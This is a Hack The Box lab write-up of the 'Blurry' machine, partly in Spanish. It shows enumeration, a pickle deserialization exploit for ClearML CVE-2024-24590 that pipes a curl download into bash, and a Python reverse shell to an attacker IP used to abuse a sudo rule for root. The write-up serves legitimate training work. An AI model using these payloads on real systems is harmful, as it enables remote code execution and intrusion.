---
title: "HTB Writeup: Blurry"
author: xpnt
date: 2024-06-14
image:
  path: https://pbs.twimg.com/media/GPZulova0AAuLHO?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 5: Anomalies"]
tags: [labs,pickle,deserialization attacks,ClearML,fickling,python]
---

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/605)

# Writeup

## Enumeration


- The pentester starts  with a port scan and discovered that `22,80` are open. Upon notice that existence of the subdomain `app.blurry.htb`, he proceed to add this subdomain and its correspondiente domain `blurry.htb` to `/etc/hosts` file

```bash
Nmap scan report for 10.10.11.19
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 14 09:45:11 2024 -- 1 IP address (1 host up) scanned in 10.96 seconds
```

- After, he proceed subdomain enumeration with a tool `gobuster` usando la wordlist [`subdomains-top1million-20000.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-20000.txt). Descubriendo así, la existencia de otros 3 subdominios (`api.blurry.htb, files.blurry.htb and chat.blurry.htb`) más que procedió a agregar al archivo `/etc/hosts`

```bash
gobuster vhost -u http://blurry.htb -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://blurry.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: api.blurry.htb Status: 400 [Size: 280]
Found: files.blurry.htb Status: 200 [Size: 2]
Found: chat.blurry.htb Status: 200 [Size: 218733]
Found: app.blurry.htb Status: 200 [Size: 13327]
```

## User

- Luego de inspeccionar la application web `app.blurry.htb`, He notó que se trataba del software `ClearML`, el cual essentially is an open-source MLOPS (*Machine Learning Operations*) platform that acts as a comprehensive toolkit, facilitating seamless transitions from experimentation to production. So He proceed a quick search for CVE related to `ClearML`, descubriendo así múltiples `CVEs` discovered by [`HiddenLayer, Inc.`](https://hiddenlayer.com/)

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614161257.png)


- After carefully reading each CVE, the pentester became particularly interested in `CVE-2024-24590` because it allows achieving RCE (Remote Code Execution)! HiddenLayer provides an excellent explanation of how [`CVE-2024-24590: Pickle Load on Artifact Get`](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/) could be exploited in a realistic scenario. Essentially, this scenario describes the possibility of exploiting an arbitrary deserialization attack. This occurs because when uploading an artifact using the `upload_artifact` method, the artifact's path is wrapped in a `pickle`. Consequently, when a user interacts casually with the artifacts by calling the `get` method, the user unintentionally deserializes the `pickle` containing the `file location`. Since this `location file` is actually a `serialized malicious code`, it inadvertently executes the attacker's payload. The pentester set out to try to exploit this vulnerability.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614163709.png)

- To exploit it, you need to be able to interact with an existing project or create a new one. This is easily achievable because `app.blurry.htb` allows you to quickly create a user to start using the service. The pentester created a user (_xpnt_) and then proceeded to generate their `App Credentials`, which he will need on their local machine for configuring the ClearML client.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614164103.png)

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614164456.png)

-  After creating your `clearml.conf` using the `clearml-init` command.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614101424.png)

>Comments: If you encounter issues with the configuration, [`Wasilios Goutas`](https://medium.com/swlh/track-your-experiments-with-clearml-b26b2d0d6518) provides an excellent explanation of how to set up `ClearML`.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614095604.png)

- To verify that the installation was successful, the pentester ran the following Python 3 code.

```python
#!/usr/bin/python3 

from clearml import Task
task = Task.init(project_name="first ClearML steps", task_name="hello")

print("hello guys, I'm xpnt")
```

- Great! The Python 3 code executed successfully in the task named `hello`, thereby creating the project `first ClearML steps`.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614101744.png)

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614101855.png)

- After that, the pentester delved deeper into `ClearML` and noticed that within the project `Black Swan`, there was a task named `Review JSON Artifacts` being repeatedly executed by the local user `jippity`. Within the `Review JSON Artifacts` task, this user ran the file `review_tasks.py`, which, as expected, reviewed each `Artifact` from all tasks that were not `archived` and were running within the `Black Swan` project containing the `review` tag.

```python
#!/usr/bin/python3

from clearml import Task
from multiprocessing import Process
from clearml.backend_api.session.client import APIClient

def process_json_artifact(data, artifact_name):
    """
    Process a JSON artifact represented as a Python dictionary.
    Print all key-value pairs contained in the dictionary.
    """
    print(f"[+] Artifact '{artifact_name}' Contents:")
    for key, value in data.items():
        print(f" - {key}: {value}")

def process_task(task):
    artifacts = task.artifacts
    
    for artifact_name, artifact_object in artifacts.items():
        data = artifact_object.get()
        
        if isinstance(data, dict):
            process_json_artifact(data, artifact_name)
        else:
            print(f"[!] Artifact '{artifact_name}' content is not a dictionary.")

def main():
    review_task = Task.init(project_name="Black Swan", 
                            task_name="Review JSON Artifacts", 
                            task_type=Task.TaskTypes.data_processing)

    # Retrieve tasks tagged for review
    tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)

    if not tasks:
        print("[!] No tasks up for review.")
        return
    
    threads = []
    for task in tasks:
        print(f"[+] Reviewing artifacts from task: {task.name} (ID: {task.id})")
        p = Process(target=process_task, args=(task,))
        p.start()
        threads.append(p)
        task.set_archived(True)

    for thread in threads:
        thread.join(60)
        if thread.is_alive():
            thread.terminate()

    # Mark the ClearML task as completed
    review_task.close()

def cleanup():
    client = APIClient()
    tasks = client.tasks.get_all(
        system_tags=["archived"],
        only_fields=["id"],
        order_by=["-last_update"],
        page_size=100,
        page=0,
    )

    # delete and cleanup tasks
    for task in tasks:
        # noinspection PyBroadException
        try:
            deleted_task = Task.get_task(task_id=task.id)
            deleted_task.delete(
                delete_artifacts_and_models=True,
                skip_models_used_by_other_tasks=True,
                raise_on_error=False
            )
        except Exception as ex:
            continue

if __name__ == "__main__":
    main()
    cleanup()

```

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614172119.png)

- To exploit the `arbitrary deserialization` vulnerability, the pentester created the following `Python` file named `pwn.py`, which allows them to establish a reverse shell. This system command will make a request to the pentester's web server, where a file named `reverse shell` is located conteniendo el payload, and then execute the contents of this file within the `bash` interpreter.

```python
#!/usr/bin/python3
import pickle
import os 
from clearml import Task

class RunCommand:
    def __reduce__(self):
        return ( os.system, ('curl "http://10.10.14.9/revshell"|bash',) )

command = RunCommand()

task = Task.init(project_name="Black Swan", task_name="xpntPwn", task_type=Task.TaskTypes.data_processing, tags=["review"])

task.upload_artifact( name='xpnt_artifact', artifact_object=command, retries=2,wait_on_upload=True)
```

- Then he executed the `pwn.py` file and received a reverse shell. He was able to read `user.txt`.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614125804.png)

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614125846.png)


## Root

- After enumerating the target host in search of ways to escalate privileges, the pentester noticed that they could execute `/usr/bin/evaluate_model /models/*.pth` as `root` without providing a password.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614132240.png)

- The pentester noticed that `/usr/bin/evaluate_model` was a `bash script`. This script is responsible for verifying, using the custom executable `fickling`, whether the `pth` file (serialized PyTorch state dictionary, basically a `pickle` file) was `safe` or `unsafe`, and then passing it as an argument when executing the script `/models/evaluate_model.py`.[Source](https://medium.com/@yulin_li/what-exactly-is-the-pth-file-9a487044a36b)

```bash
file /usr/bin/evaluate_model
```

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614173825.png)

```bash
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/models/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
    
fi
```

### Delving **fickling**

> The pentester inspected the contents of the `python` executable file `/usr/local/bin/fickling`, which essentially involves removing certain words from its own name and then calls the `__main__` function of `fickling`.
>
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from fickling.__main__ import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
>
> Reviewing the `fickling` repository, the pentester noticed that [`__main__.py`](https://github.com/trailofbits/fickling/blob/master/fickling/__main__.py) makes a call to the `main` function in `cli.py`.
>
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614180308.png)
>
> After the pentester inspected the code of `cli.py`, they understood the purpose of each parameter.
>
> **Option `--json-output`** 
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614180658.png)
>
>
> **Option `-s`**
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614180840.png)
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614181513.png)
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614181533.png)
>
>
> **Delving into the file `analysis.py`**
>
>Given that when the `check_safety` function is called without specifying the `analyzer` parameter, it is set to `None`, which causes the `analyzer` parameter to be reassigned to `Analyzer.default_instance`
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614181753.png)
>	
>
>It's worth mentioning that `Analyzer` comes from the metaclass `AnalyzerMeta`.
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614192829.png)
>	
>	
>With that in mind, within the definition of the metaclass `AnalyzerMeta`, a static method `default_instance` is defined that can be accessed like an attribute. Inside the `default_instance` method, the `_DEFAULT_INSTANCE` variable, which points to an instance of the `Analyzer` class, is reassigned to hold an instance of the `Analyzer` class that in turn contains an instance of the `Analysis` class.
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614191603.png)
>		
>`Analysis.ALL` is a class variable in the abstract class `Analysis`, which maintains a list of all concrete subclasses that have been created from `Analysis`.
>
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614192604.png)
>		
> It's important to note that thanks to the methods of subclasses like `OvertlyBadEvals`, `UnsafeImports`, etc., which inherit from the `Analysis` class, [`fickling`](https://github.com/trailofbits/fickling) performs the verification of whether a `pickle` is `safe` or `unsafe`.
>		
>![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614195235.png)
{: .prompt-info }

### Sudo Rights Abuse
- The pentester enumerated the permissions of the `/models` directory and observed that the user `jippity` has write permissions on the `/models` directory. This allows `jippity` to create their own `/models/evaluate_model.py`, potentially enabling them to obtain a reverse shell!

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614201550.png)

- So, to abuse the command that `jippity` can execute as `root`, it's necessary to have a safe `pth` file to pass the validation of [`fickling`](https://github.com/trailofbits/fickling). This is straightforward to obtain; a quick search allows us to get the following `model.pth` file.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614202347.png)

- Then the pentester created their malicious `/models/evaluate_model.py` with the following content.

```python
import socket, subprocess, os, pty
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.9", 4445)); os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

- With that, it would be enough to upload the `model.pth` to the `/models` folder of the target host and execute the following command.

```bash
wget http://10.10.14.9/model.pth -O /models/example.pth

echo -n 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.14.9", 4445)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); import pty; pty.spawn("/bin/bash")' > /models/evaluate_model.py

sudo /usr/bin/evaluate_model /models/example.pth
```

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614203153.png)

- Finally, they manage to obtain a reverse shell as `root` and can read the `root.txt` file.

![](/assets/images/HTB-Writeup-Blurry/Pasted image 20240614173256.png)

>I hope you had as much fun reading this write up as I did writing it. Happy Hacking!!👾
{: .prompt-tip }